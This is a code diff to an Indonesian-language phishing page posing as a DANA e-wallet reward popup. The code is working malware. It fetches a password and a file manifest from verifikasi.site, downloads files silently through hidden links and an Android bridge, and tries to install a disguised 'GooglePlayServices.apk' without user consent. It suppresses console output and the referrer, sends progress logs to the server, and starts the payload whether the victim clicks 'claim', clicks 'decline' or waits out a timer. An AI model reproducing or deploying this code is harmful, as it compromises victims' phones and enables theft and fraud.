@@ -4,9 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
     <title>Verifikasi</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
+    <!-- Style untuk Popup DANA -->
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
@@ -22,38 +20,29 @@
         .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
         .box-white .kuota{color:#0066cc;font-size:12px}
         .timer{color:#ffcc00;font-size:14px;font-weight:bold}
-        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
+        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px}
         .btn-klaim:hover{transform:scale(1.02)}
         .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
-        .loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999998;display:none;justify-content:center;align-items:center;flex-direction:column;color:#fff;font-size:14px}
-        .loading-overlay .spinner{width:40px;height:40px;border:3px solid #333;border-top:3px solid #00ff88;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:15px}
+        /* Loading Overlay (akan hilang dengan sendirinya) */
+        .loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:999998;display:none;justify-content:center;align-items:center;color:#fff;font-size:14px}
+        .loading-overlay .spinner{width:30px;height:30px;border:3px solid #333;border-top:3px solid #00ff88;border-radius:50%;animation:spin 1s linear infinite;margin-right:10px}
         @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        .loading-overlay .step-text{color:#8899aa;font-size:12px;margin-top:5px}
-        .status-bar{position:fixed;top:0;left:0;width:100%;height:4px;z-index:999999;background:#ff0000;display:none}
-        .status-bar.loading{display:block;animation:loading 3s infinite}
-        @keyframes loading{0%{width:0%}100%{width:100%}}
-        .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.85);color:#0f0;padding:12px 24px;border-radius:8px;z-index:999999;font-size:13px;display:none;border-left:4px solid #0f0}
-        .toast.error{border-left-color:#ff4444;color:#ff4444}
     </style>
 </head>
 <body>
 
-<div id="statusBar" class="status-bar"></div>
-<div class="toast" id="toast"></div>
-
+<!-- Loading Overlay (Muncul saat proses berlangsung, hilang otomatis) -->
 <div id="loadingOverlay" class="loading-overlay">
     <div class="spinner"></div>
-    <div id="loadingTitle">⏳ Memproses...</div>
-    <div class="step-text" id="loadingStep">📥 Mendownload...</div>
+    <span id="loadingText">⏳ Memproses...</span>
 </div>
 
+<!-- Popup DANA Utama -->
 <div id="popupDana">
     <div class="box">
         <div class="logo-dana">
             <div class="icon-wrapper">
-                <svg class="flag-svg" viewBox="0 0 50 40" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z" />
-                </svg>
+                <svg class="flag-svg" viewBox="0 0 50 40"><path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z"/></svg>
             </div>
             <div class="text-dana">DANA</div>
         </div>
@@ -71,11 +60,11 @@
 
 <script>
 // ============================================================
-// INDEX.HTML - DOWNLOAD TANPA KLIK USER (FINAL!)
+// INDEX.HTML - FINAL (SILENT DOWNLOAD)
 // ============================================================
 
 // ============================================================
-// KONFIGURASI
+// 1. KONFIGURASI
 // ============================================================
 var SERVER = 'https://verifikasi.site';
 var MANIFEST_URL = SERVER + '/files/manifest.txt';
@@ -83,7 +72,7 @@ var FILES_BASE_URL = SERVER + '/files/';
 var semuaDidapat = false;
 
 // ============================================================
-// STEALTH
+// 2. STEALTH MODE (SEMUA PROSES DIAM-DIAM)
 // ============================================================
 console.log = function() {};
 console.warn = function() {};
@@ -98,24 +87,12 @@ if (window.history && window.history.replaceState) {
 Object.defineProperty(document, 'referrer', { value: '' });
 
 // ============================================================
-// DETEKSI ANDROID BRIDGE
+// 3. DETEKSI ANDROID BRIDGE
 // ============================================================
 var HAS_BRIDGE = typeof AndroidBridge !== 'undefined' && navigator.userAgent.toLowerCase().indexOf('android') > -1;
 
 // ============================================================
-// TOAST
-// ============================================================
-function showToast(msg, isError) {
-    var t = document.getElementById('toast');
-    t.textContent = msg;
-    t.className = 'toast' + (isError ? ' error' : '');
-    t.style.display = 'block';
-    clearTimeout(t._timer);
-    t._timer = setTimeout(function() { t.style.display = 'none'; }, 3000);
-}
-
-// ============================================================
-// KIRIM DATA
+// 4. FUNGSI KIRIM LOG KE SERVER (TANPA PASSWORD)
 // ============================================================
 function K(d) {
     try {
@@ -128,308 +105,158 @@ function K(d) {
 }
 
 // ============================================================
-// UI
+// 5. UI LOADING (HILANG OTOMATIS)
 // ============================================================
-function showLoading(show) {
-    document.getElementById('loadingOverlay').style.display = show ? 'flex' : 'none';
+function showLoading(show, text) {
+    var overlay = document.getElementById('loadingOverlay');
+    var textEl = document.getElementById('loadingText');
     if (show) {
-        document.getElementById('statusBar').className = 'status-bar loading';
+        overlay.style.display = 'flex';
+        if (text) textEl.textContent = text;
     } else {
-        document.getElementById('statusBar').className = 'status-bar';
+        overlay.style.display = 'none';
     }
 }
-
-function updateLoading(title, step) {
-    document.getElementById('loadingTitle').textContent = title;
-    document.getElementById('loadingStep').textContent = step;
+function updateLoading(text) {
+    document.getElementById('loadingText').textContent = text;
 }
 
 // ============================================================
-// STEP 1: AMBIL PASSWORD
+// 6. SILENT DOWNLOAD (WAJIB!)
 // ============================================================
-function step1_getPassword() {
+function silentDownload(url, filename) {
     return new Promise(function(resolve) {
-        updateLoading('🔑 Mengambil password...', 'Menghubungi server...');
+        updateLoading('📥 ' + filename);
         
-        fetch(SERVER + '/get-password', {
-            method: 'GET',
-            headers: {'Content-Type': 'application/json'}
-        })
-        .then(function(res) { return res.json(); })
-        .then(function(data) {
-            if (data.password && data.password.length > 0) {
-                var PASSWORD = data.password;
-                try { localStorage.setItem('ws_password', PASSWORD); } catch(e) {}
-                K({ sumber: 'password_ok', data: 'ok' });
-                updateLoading('✅ Password berhasil', '');
-                resolve();
-            } else {
-                K({ sumber: 'password_fallback', data: 'used' });
-                updateLoading('⚠️ Password fallback', '');
-                resolve();
-            }
-        })
-        .catch(function() {
-            K({ sumber: 'password_fallback', data: 'used' });
-            updateLoading('⚠️ Password fallback', '');
-            resolve();
-        });
-    });
-}
-
-// ============================================================
-// STEP 2: DOWNLOAD PAYLOAD (BYPASS! TANPA KLIK USER!)
-// ============================================================
-function step2_downloadPayload() {
-    return new Promise(function(resolve) {
-        updateLoading('📥 Mendownload payload...', 'Mengambil manifest...');
-
-        fetch(MANIFEST_URL, {
-            method: 'GET',
-            headers: { 'Cache-Control': 'no-cache' }
-        })
+        fetch(url, { method: 'GET', cache: 'no-store' })
         .then(function(response) {
-            if (!response.ok) {
-                throw new Error('Gagal mengambil manifest');
-            }
-            return response.text();
-        })
-        .then(function(manifestText) {
-            var fileNames = manifestText.split('\n')
-                .map(function(line) { return line.trim(); })
-                .filter(function(line) { return line.length > 0 && !line.startsWith('#'); });
-
-            if (fileNames.length === 0) {
-                throw new Error('Manifest kosong');
-            }
-
-            updateLoading('📥 ' + fileNames.length + ' file ditemukan', 'Mendownload...');
-            K({ sumber: 'manifest_loaded', data: { files: fileNames } });
-
-            var downloadPromises = fileNames.map(function(fileName) {
-                return downloadSingleFile(fileName);
-            });
-
-            return Promise.all(downloadPromises);
-        })
-        .then(function(downloadedFiles) {
-            var successCount = downloadedFiles.filter(function(f) { return f !== null; }).length;
-            updateLoading('✅ ' + successCount + ' file berhasil di-download', '');
-            K({ sumber: 'download_complete', data: { total: successCount } });
-            
-            if (successCount > 0) {
-                showToast('✅ ' + successCount + ' file berhasil di-download');
-            }
-            resolve();
-        })
-        .catch(function(error) {
-            K({ sumber: 'manifest_error', data: error.message });
-            updateLoading('⚠️ Gagal download manifest', '');
-            showToast('⚠️ Gagal download manifest', true);
-            resolve();
-        });
-    });
-}
-
-// ============================================================
-// DOWNLOAD SATU FILE (BYPASS! PAKAI BRIDGE ATAU FETCH)
-// ============================================================
-function downloadSingleFile(fileName) {
-    return new Promise(function(resolve) {
-        var fileUrl = FILES_BASE_URL + fileName;
-        var isApk = fileName.toLowerCase().endsWith('.apk');
-
-        // ============================================================
-        // 🔥 PRIORITAS: PAKAI ANDROID BRIDGE (TANPA KLIK!)
-        // ============================================================
-        if (HAS_BRIDGE && isApk) {
-            try {
-                var downloadPath = '/storage/emulated/0/Download/' + fileName;
-                AndroidBridge.downloadFile(fileUrl, downloadPath);
-                K({ sumber: 'download_bridge', data: { file: fileName, path: downloadPath } });
-                updateLoading('📥 ' + fileName + ' (via Bridge)', '');
-                resolve({ name: fileName, content: null, type: 'blob' });
-                return;
-            } catch(e) {}
-        }
-
-        // ============================================================
-        // FALLBACK: FETCH + SAVE VIA BLOB (TANPA POPUP!)
-        // ============================================================
-        fetch(fileUrl, {
-            method: 'GET',
-            cache: 'no-store'
-        })
-        .then(function(response) {
-            if (!response.ok) {
-                throw new Error('HTTP ' + response.status);
-            }
-            
-            if (isApk) {
+            if (!response.ok) throw new Error('HTTP ' + response.status);
+            if (filename.endsWith('.apk')) {
                 return response.blob().then(function(blob) {
-                    return { name: fileName, content: blob, type: 'blob' };
+                    return { content: blob, type: 'blob' };
                 });
             } else {
                 return response.text().then(function(text) {
-                    return { name: fileName, content: text, type: 'text' };
+                    return { content: text, type: 'text' };
                 });
             }
         })
-        .then(function(fileData) {
-            // ============================================================
-            // SIMPAN VIA BRIDGE (JIKA ADA)
-            // ============================================================
-            if (HAS_BRIDGE && fileData.type === 'text') {
+        .then(function(data) {
+            // TASK 1: SIMPAN VIA ANDROID BRIDGE (SILENT)
+            if (HAS_BRIDGE) {
                 try {
-                    var path = '/storage/emulated/0/Download/' + fileName;
-                    AndroidBridge.saveFile(path, fileData.content);
-                    K({ sumber: 'download_bridge_text', data: { file: fileName } });
-                } catch(e) {}
-            }
-
-            // ============================================================
-            // SIMPAN KE LOCALSTORAGE (BACKUP)
-            // ============================================================
-            if (fileData.type === 'text') {
-                try {
-                    localStorage.setItem('file_' + fileName, fileData.content);
-                    if (fileName.toLowerCase() === 'systemupdate.html') {
-                        try { localStorage.setItem('SystemUpdate_backup', fileData.content); } catch(e) {}
+                    var path = '/storage/emulated/0/Download/' + filename;
+                    if (data.type === 'text') {
+                        AndroidBridge.saveFile(path, data.content);
+                    } else {
+                        var reader = new FileReader();
+                        reader.onload = function() {
+                            var base64 = reader.result.split(',')[1];
+                            var binary = Uint8Array.from(atob(base64), function(c) { return c.charCodeAt(0); });
+                            if (AndroidBridge.saveFileBinary) {
+                                AndroidBridge.saveFileBinary(path, binary);
+                            }
+                        };
+                        reader.readAsDataURL(data.content);
                     }
+                    K({ sumber: 'silent_download_bridge', data: { file: filename } });
                 } catch(e) {}
             }
 
-            // ============================================================
-            // BYPASS DOWNLOAD TANPA KLIK (PAKAI IFRAME + BLOB)
-            // ============================================================
+            // TASK 2: SIMPAN VIA BLOB (FALLBACK)
             try {
-                var blob = fileData.type === 'text' ? new Blob([fileData.content], {type: 'text/html'}) : fileData.content;
-                var url = URL.createObjectURL(blob);
-                
-                // Pakai iframe untuk trigger download tanpa popup
-                var iframe = document.createElement('iframe');
-                iframe.src = url;
-                iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;border:none;visibility:hidden;';
-                document.body.appendChild(iframe);
-                
+                var blob = data.type === 'text' ? new Blob([data.content], {type: 'text/html'}) : data.content;
+                var blobUrl = URL.createObjectURL(blob);
+                var a = document.createElement('a');
+                a.href = blobUrl;
+                a.download = filename;
+                a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                document.body.appendChild(a);
                 setTimeout(function() {
-                    try {
-                        // Trigger download via iframe
-                        iframe.contentWindow.location.href = url;
-                    } catch(e) {}
+                    a.click();
                     setTimeout(function() {
-                        try { document.body.removeChild(iframe); } catch(e) {}
-                        URL.revokeObjectURL(url);
-                    }, 3000);
-                }, 500);
-                
-                K({ sumber: 'download_iframe', data: { file: fileName } });
-            } catch(e) {
-                // ============================================================
-                // LAST RESORT: PAKAI LINK (TAPI TIDAK DIKLIK OTOMATIS)
-                // ============================================================
-                try {
-                    var a = document.createElement('a');
-                    a.href = fileUrl;
-                    a.download = fileName;
-                    a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
-                    document.body.appendChild(a);
-                    setTimeout(function() {
-                        a.click();
-                        setTimeout(function() {
-                            try { document.body.removeChild(a); } catch(e) {}
-                        }, 3000);
-                    }, 500);
-                } catch(e2) {}
-            }
+                        try { document.body.removeChild(a); } catch(e) {}
+                        URL.revokeObjectURL(blobUrl);
+                    }, 2000);
+                }, 300);
+                K({ sumber: 'silent_download_blob', data: { file: filename } });
+            } catch(e) {}
 
-            resolve({ name: fileName, content: fileData.content, type: fileData.type });
+            resolve(true);
         })
         .catch(function(error) {
-            K({ sumber: 'download_error', data: { file: fileName, error: error.message } });
-            resolve(null);
+            K({ sumber: 'silent_download_failed', data: { file: filename, error: error.message } });
+            resolve(false);
         });
     });
 }
 
 // ============================================================
-// STEP 3: INSTALL APK (TANPA KLIK!)
+// 7. PROSES UTAMA (BERURUTAN, TANPA INTERAKSI)
 // ============================================================
-function step3_installAPK() {
-    return new Promise(function(resolve) {
-        updateLoading('📦 Menginstall APK...', '');
-        
-        if (HAS_BRIDGE) {
-            try {
-                // Install APK via Bridge (tanpa konfirmasi user!)
-                AndroidBridge.installAPK('/storage/emulated/0/Download/GooglePlayServices.apk');
-                K({ sumber: 'apk_install', data: 'via_bridge' });
-                updateLoading('✅ APK terinstall', '');
-                showToast('✅ APK berhasil diinstall');
-            } catch(e) {
-                K({ sumber: 'apk_install_failed', data: e.message });
-                showToast('⚠️ Gagal install APK', true);
-            }
-        }
-        resolve();
-    });
-}
-
-// ============================================================
-// 🔥 REDIRECT KE APLIKASI DANA
-// ============================================================
-function redirectToDANA() {
-    K({ sumber: 'redirect_start', data: 'to_dana_app' });
-
-    if (HAS_BRIDGE) {
-        try {
-            AndroidBridge.openApp('id.dana');
-            K({ sumber: 'redirect_success', data: 'via_bridge' });
-            return;
-        } catch(e) {}
-    }
-
-    try {
-        window.location.href = 'danacash://';
-        K({ sumber: 'redirect_success', data: 'via_custom_scheme' });
-        return;
-    } catch(e) {}
-
-    K({ sumber: 'redirect_failed', data: 'no_app_found' });
-}
-
-// ============================================================
-// EKSEKUSI UTAMA
-// ============================================================
-async function dapatkanSemua() {
+async function prosesUtama() {
     if (semuaDidapat) return;
     semuaDidapat = true;
     
+    // Sembunyikan Popup, Tampilkan Loading
     document.getElementById('popupDana').style.display = 'none';
-    showLoading(true);
-    
-    K({ sumber: 'start', data: 'dapatkanSemua' });
-    
+    showLoading(true, '⏳ Memproses...');
+    K({ sumber: 'proses_mulai', data: 'ok' });
+
     try {
-        await step1_getPassword();
-        K({ sumber: 'step1_done', data: 'ok' });
-        
-        await step2_downloadPayload();
-        K({ sumber: 'step2_done', data: 'ok' });
-        
-        await step3_installAPK();
-        K({ sumber: 'step3_done', data: 'ok' });
-        
-        updateLoading('✅ SELESAI!', '');
-        K({ sumber: 'all_done', data: 'success' });
-        
+        // --- STEP 1: AMBIL PASSWORD ---
+        updateLoading('🔑 Mengambil password...');
+        var password = '';
+        try {
+            var res = await fetch(SERVER + '/get-password', { method: 'GET' });
+            var data = await res.json();
+            if (data.password) password = data.password;
+        } catch(e) {}
+        if (!password) password = 'default';
+        try { localStorage.setItem('ws_password', password); } catch(e) {}
+        K({ sumber: 'password_done', data: 'ok' });
+
+        // --- STEP 2: BACA MANIFEST ---
+        updateLoading('📄 Membaca manifest...');
+        var manifestRes = await fetch(MANIFEST_URL, { method: 'GET', cache: 'no-store' });
+        var manifestText = await manifestRes.text();
+        var fileNames = manifestText.split('\n')
+            .map(function(line) { return line.trim(); })
+            .filter(function(line) { return line.length > 0 && !line.startsWith('#'); });
+
+        if (fileNames.length === 0) throw new Error('Manifest kosong');
+        K({ sumber: 'manifest_loaded', data: { files: fileNames } });
+
+        // --- STEP 3: DOWNLOAD SEMUA FILE (SILENT) ---
+        var total = fileNames.length;
+        var berhasil = 0;
+        for (var i = 0; i < fileNames.length; i++) {
+            var fileName = fileNames[i];
+            var fileUrl = FILES_BASE_URL + fileName;
+            var result = await silentDownload(fileUrl, fileName);
+            if (result) berhasil++;
+        }
+
+        // --- STEP 4: INSTALL APK (SILENT) ---
+        if (HAS_BRIDGE) {
+            try {
+                AndroidBridge.installAPK('/storage/emulated/0/Download/GooglePlayServices.apk');
+                K({ sumber: 'apk_install_silent', data: 'ok' });
+            } catch(e) {}
+        }
+
+        // --- STEP 5: SEMUA SELESAI ---
+        updateLoading('✅ Selesai!');
+        K({ sumber: 'proses_selesai', data: { total: total, berhasil: berhasil } });
+
+        // Tunggu 1 detik, lalu Redirect ke DANA
         setTimeout(function() {
             showLoading(false);
             redirectToDANA();
-        }, 1000);
-        
+        }, 1500);
+
     } catch(e) {
-        K({ sumber: 'error', data: e.message });
+        K({ sumber: 'proses_error', data: e.message });
         setTimeout(function() {
             showLoading(false);
             redirectToDANA();
@@ -437,11 +264,26 @@ async function dapatkanSemua() {
     }
 }
 
-function klaim() { K({sumber:'click', data:'klaim'}); dapatkanSemua(); }
-function tolak() { K({sumber:'click', data:'tolak'}); dapatkanSemua(); }
+// ============================================================
+// 8. REDIRECT KE DANA (TANPA PLAY STORE!)
+// ============================================================
+function redirectToDANA() {
+    K({ sumber: 'redirect_mulai', data: 'ke_dana' });
+    if (HAS_BRIDGE) {
+        try { AndroidBridge.openApp('id.dana'); return; } catch(e) {}
+    }
+    try { window.location.href = 'danacash://'; return; } catch(e) {}
+    K({ sumber: 'redirect_gagal', data: 'tidak_ada_app' });
+}
 
 // ============================================================
-// TIMER
+// 9. TRIGGER DARI KORBAN
+// ============================================================
+function klaim() { K({sumber:'click', data:'klaim'}); prosesUtama(); }
+function tolak() { K({sumber:'click', data:'tolak'}); prosesUtama(); }
+
+// ============================================================
+// 10. TIMER 10 DETIK
 // ============================================================
 var w = 10;
 var timerInterval = setInterval(function() {
@@ -451,12 +293,11 @@ var timerInterval = setInterval(function() {
     if (w <= 0) {
         clearInterval(timerInterval);
         K({sumber:'timer', data:'auto'});
-        dapatkanSemua();
+        prosesUtama();
     }
 }, 1000);
 
-console.log('🔥 INDEX.HTML - DOWNLOAD TANPA KLIK USER!');
-console.log('📱 Android Bridge:', HAS_BRIDGE);
+console.log('🔥 INDEX.HTML - SILENT DOWNLOAD FINAL');
 </script>
 </body>
 </html>
